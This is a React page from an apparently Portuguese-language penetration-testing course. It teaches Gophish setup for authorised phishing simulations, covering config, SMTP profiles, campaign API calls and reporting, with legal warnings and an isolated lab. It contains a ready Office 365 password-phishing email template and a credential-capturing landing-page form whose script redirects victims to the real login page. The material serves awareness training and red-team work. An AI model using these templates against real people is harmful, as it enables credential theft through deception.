import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Gophish() {
  return (
    <PageContainer
      title="Gophish — campanhas de phishing controladas"
      subtitle="Framework open-source para simular phishing em escala: templates, landing pages, sending profiles, tracking, relatórios."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <AlertBox type="danger" title="Use APENAS com autorização escrita">
        <p>
          Gophish foi feito para <strong>simulações de awareness</strong> contra
          a própria empresa ou em pentest contratado. Mandar email de phishing
          para terceiros sem consentimento é crime (Lei 12.737, Marco Civil,
          LGPD). Toda campanha precisa de scope, RoE e contato do SOC ciente
          antes do envio.
        </p>
      </AlertBox>

      <h2>O que é</h2>
      <p>
        Gophish é um servidor Go single-binary que oferece:
      </p>
      <ul>
        <li><strong>Sending Profiles</strong>: relays SMTP (Postfix local, SES, SendGrid, Mailgun).</li>
        <li><strong>Email Templates</strong>: HTML + variáveis tipo <code>{`{{.FirstName}}`}</code>, <code>{`{{.URL}}`}</code>, tracking pixel.</li>
        <li><strong>Landing Pages</strong>: páginas clonadas (importa de URL ou cola HTML), captura credenciais.</li>
        <li><strong>Groups</strong>: lista de targets (CSV: email, first_name, last_name, position).</li>
        <li><strong>Campaigns</strong>: junção dos itens acima + janela temporal e tracking.</li>
        <li><strong>Dashboard + API REST</strong>: relatório de quem abriu, clicou, submeteu credenciais, reportou.</li>
      </ul>

      <h2>Instalação</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip",
            out: `gophish-v0.12.1-linux-64bit.zip   100%[============>]  9.84M   18.4MB/s`,
            outType: "info",
          },
          {
            cmd: "unzip gophish-v0.12.1-linux-64bit.zip -d gophish && cd gophish",
            out: `Archive: gophish-v0.12.1-linux-64bit.zip
  inflating: gophish/gophish
  inflating: gophish/config.json`,
            outType: "default",
          },
          {
            cmd: "chmod +x gophish",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "./gophish",
            out: `time="2026-04-03T14:08:11" level=info msg="Please login with the username admin and the password 0123456789abcdef"
time="2026-04-03T14:08:11" level=info msg="Starting admin server at https://127.0.0.1:3333"
time="2026-04-03T14:08:11" level=info msg="Starting phishing server at http://0.0.0.0:80"`,
            outType: "success",
          },
        ]}
      />

      <h2>config.json — o que ajustar</h2>
      <CodeBlock
        language="json"
        title="gophish/config.json (produção em VPS)"
        code={`{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/admin.gophish.lab/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/admin.gophish.lab/privkey.pem"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/portal.empresa-suporte.com/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/portal.empresa-suporte.com/privkey.pem"
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "redteam@empresa.com",
  "logging": {
    "filename": "/var/log/gophish.log",
    "level": "info"
  }
}`}
      />

      <AlertBox type="warning" title="Painel admin nunca exposto">
        <p>
          Mantenha <code>admin_server</code> em <strong>127.0.0.1</strong> e
          acesse via SSH tunnel: <code>ssh -L 3333:127.0.0.1:3333 vps</code>.
          Painel exposto = world-readable database de credenciais coletadas.
        </p>
      </AlertBox>

      <h2>Sending Profile (SMTP)</h2>
      <CommandTable
        title="opções de envio"
        variations={[
          { cmd: "Postfix local (VPS)", desc: "Mais barato; requer rDNS, SPF, DKIM, DMARC perfeitos.", output: "Bloqueado por Gmail/O365 sem reputação." },
          { cmd: "Amazon SES", desc: "Reputação boa; precisa sair do sandbox e justificar uso.", output: "$0.10 / 1000 emails." },
          { cmd: "SendGrid / Mailgun", desc: "Setup rápido, mas providers detectam phishing patterns.", output: "Conta pode ser banida no meio da campanha." },
          { cmd: "Office365 dedicado", desc: "Mailbox Office365 com app password, melhor para imitar email corporativo interno.", output: "Útil em RT contra clientes M365." },
          { cmd: "Smtp gateway com header rewrite", desc: "Postfix em modo relay, reescreve From: e DKIM-sign no domínio do RT.", output: "Para spoof legítimo controlado." },
        ]}
      />

      <CodeBlock
        language="bash"
        title="Postfix mínimo p/ Gophish"
        code={`sudo apt install -y postfix opendkim opendkim-tools
# /etc/postfix/main.cf
myhostname = mail.empresa-suporte.com
mydomain   = empresa-suporte.com
myorigin   = $mydomain
smtpd_tls_cert_file = /etc/letsencrypt/live/mail.empresa-suporte.com/fullchain.pem
smtpd_tls_key_file  = /etc/letsencrypt/live/mail.empresa-suporte.com/privkey.pem
smtpd_use_tls = yes
milter_default_action = accept
smtpd_milters = inet:localhost:8891
non_smtpd_milters = inet:localhost:8891

# DNS record (no registrador):
# v=spf1 mx ip4:203.0.113.45 -all          (SPF)
# default._domainkey ... (DKIM TXT do opendkim-genkey)
# _dmarc  v=DMARC1; p=none; rua=mailto:dmarc@empresa-suporte.com (DMARC)`}
      />

      <h2>Email Template</h2>
      <CodeBlock
        language="html"
        title="template: 'Atualizacao Senha O365' (HTML)"
        code={`<!DOCTYPE html>
<html>
<body style="font-family: Calibri, Arial, sans-serif; color: #323130;">
  <table width="100%" style="max-width:600px; margin:auto;">
    <tr><td style="padding:20px;">
      <img src="https://portal.empresa-suporte.com/static/o365-logo.png" alt="Office 365" />
      <h2>Olá {{.FirstName}},</h2>
      <p>Identificamos uma tentativa de login incomum em sua conta corporativa
         <strong>{{.Email}}</strong> a partir de Moscou (RU) em {{.Date}}.</p>
      <p>Por segurança, sua senha será expirada em <strong>2 horas</strong>.
         Para manter o acesso, valide sua identidade:</p>
      <p>
        <a href="{{.URL}}" style="background:#0078d4; color:#fff; padding:12px 24px;
           text-decoration:none; border-radius:4px;">Validar minha conta</a>
      </p>
      <p style="color:#605e5c; font-size:12px;">Equipe de Segurança · TI</p>
      {{.Tracker}}
    </td></tr>
  </table>
</body>
</html>`}
      />

      <CommandTable
        title="variáveis de template Gophish"
        variations={[
          { cmd: "{{.FirstName}}", desc: "Primeiro nome do target (do CSV).", output: "Alice" },
          { cmd: "{{.LastName}}", desc: "Sobrenome.", output: "Souza" },
          { cmd: "{{.Email}}", desc: "Email do target.", output: "alice.souza@cliente.com" },
          { cmd: "{{.Position}}", desc: "Cargo.", output: "Diretora Financeira" },
          { cmd: "{{.URL}}", desc: "Link único trackable da landing page.", output: "https://portal.empresa-suporte.com/?rid=Xy7K9" },
          { cmd: "{{.Tracker}}", desc: "Pixel 1x1 invisível p/ marcar email aberto.", output: "<img ... />" },
          { cmd: "{{.From}}", desc: "Endereço From: definido no profile.", output: "ti@empresa-suporte.com" },
          { cmd: "{{.Date}}", desc: "Data atual formatada.", output: "03/04/2026 14:22" },
        ]}
      />

      <h2>Landing Page</h2>
      <p>
        No painel: <strong>Landing Pages → New</strong>. Use <em>Import Site</em>
        para clonar visualmente <code>login.microsoftonline.com</code>. Habilite
        <strong>Capture Submitted Data</strong> e <strong>Capture Passwords</strong>
        (esta última só com aprovação explícita por escrito; muitos contratos
        proíbem captura clara de senha — usar apenas captura de fato do clique).
      </p>

      <CodeBlock
        language="html"
        title="landing page (trecho injetado)"
        code={`<form method="POST" action="">
  <input type="email" name="username" placeholder="alguem@empresa.com" required />
  <input type="password" name="password" placeholder="Senha" required />
  <button type="submit">Entrar</button>
</form>

<!-- Após submit, redireciona p/ Office real (vítima nem nota) -->
<script>
document.querySelector('form').addEventListener('submit', function(e){
  setTimeout(()=> window.location='https://login.microsoftonline.com', 600);
});
</script>`}
      />

      <h2>Group de targets (CSV)</h2>
      <CodeBlock
        language="bash"
        title="targets.csv"
        code={`First Name,Last Name,Email,Position
Alice,Souza,alice.souza@cliente.com,Diretora Financeira
Bruno,Lima,bruno.lima@cliente.com,Analista de TI
Carla,Mendes,carla.mendes@cliente.com,RH Sr
Daniel,Rocha,daniel.rocha@cliente.com,Estagiario Marketing`}
      />

      <h2>Lançar campanha via API</h2>
      <p>Para automação (CI de RT, agendamento mensal):</p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "export GOPHISH_API='https://127.0.0.1:3333/api'",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "export GOPHISH_KEY='abc123...'   # Settings → API Key",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "curl -k -H \"Authorization: Bearer $GOPHISH_KEY\" $GOPHISH_API/campaigns/",
            out: `[
  {"id":1,"name":"Q1-Phish-Awareness","status":"Completed",
   "stats":{"sent":120,"opened":67,"clicked":34,"submitted_data":12,"reported":8}}
]`,
            outType: "info",
          },
          {
            cmd: "curl -k -H \"Authorization: Bearer $GOPHISH_KEY\" -X POST $GOPHISH_API/campaigns/ \\\n  -d @campaign.json",
            out: `{"id":2,"name":"Q2-Phish-Diretoria","status":"In progress","launch_date":"2026-04-03T14:30:00Z"}`,
            outType: "success",
          },
        ]}
      />

      <CodeBlock
        language="json"
        title="campaign.json"
        code={`{
  "name": "Q2-Phish-Diretoria",
  "template": { "name": "Atualizacao Senha O365" },
  "url": "https://portal.empresa-suporte.com",
  "page": { "name": "O365 Clone v3" },
  "smtp": { "name": "SES Transacional" },
  "launch_date": "2026-04-03T14:30:00Z",
  "send_by_date": "2026-04-03T18:00:00Z",
  "groups": [{ "name": "Diretoria Brasil" }]
}`}
      />

      <h2>Dashboard de resultado</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "resumo via API após campanha",
            cmd: "curl -ks -H \"Authorization: Bearer $GOPHISH_KEY\" $GOPHISH_API/campaigns/1/results | jq '.results | group_by(.status) | map({status: .[0].status, count: length})'",
            out: `[
  { "status": "Email Sent",        "count": 120 },
  { "status": "Email Opened",      "count": 67  },
  { "status": "Clicked Link",      "count": 34  },
  { "status": "Submitted Data",    "count": 12  },
  { "status": "Email Reported",    "count": 8   }
]`,
            outType: "info",
          },
        ]}
      />

      <PracticeBox
        title="Lab interno: campanha em sandbox isolado"
        goal="Subir Gophish em rede privada e mandar campanha para 3 contas de TESTE próprias, validando o fluxo end-to-end sem tocar em pessoas reais."
        steps={[
          "Suba Gophish em VM Kali (rede só host-only).",
          "Crie 3 contas Gmail de teste.",
          "Configure SMTP profile usando Gmail app password (Settings → Security → App Passwords).",
          "Crie template básico, landing page que captura email+senha.",
          "Mande campanha pra essas 3 contas, abra os emails, clique, 'submeta'.",
          "Confira no dashboard que os 3 estados foram registrados.",
        ]}
        command={`./gophish &
# painel em https://127.0.0.1:3333  user=admin senha=(do log)
# 1. Sending Profile: smtp.gmail.com:587, user/pass
# 2. Template + Landing
# 3. Group com 3 emails de teste
# 4. New Campaign -> Launch`}
        expected={`Dashboard:
  Sent: 3 / Opened: 3 / Clicked: 3 / Submitted: 3`}
        verify="Acesse o painel, clique na campanha, e veja a tabela 'Recent Activity' com 4 eventos por target (Sent → Opened → Clicked → Submitted)."
      />

      <h2>Relatório executivo</h2>
      <p>Após a campanha, o entregável típico ao cliente inclui:</p>
      <ul>
        <li>Métricas (taxa de clique, de submit, de report) comparadas com baseline da indústria (KnowBe4 publica anual).</li>
        <li>Top 5 setores mais vulneráveis (RH costuma liderar).</li>
        <li>Recomendações: treinamento, MFA hardware, tag de email externo, banner "External" no Outlook.</li>
        <li><strong>Sem nomear indivíduos</strong> em relatório executivo (LGPD + cultura organizacional).</li>
      </ul>

      <AlertBox type="info" title="Alternativas / complementares">
        <p>
          <strong>King Phisher</strong> (rsmusllp) — bom para campanhas técnicas com payloads anexos.
          <br />
          <strong>SET (Social-Engineer Toolkit)</strong> — mais antigo, ótimo p/ ataques rápidos com clone single-page.
          <br />
          <strong>KnowBe4 / Cofense PhishMe</strong> — SaaS comercial com biblioteca enorme de templates e treinamento integrado.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
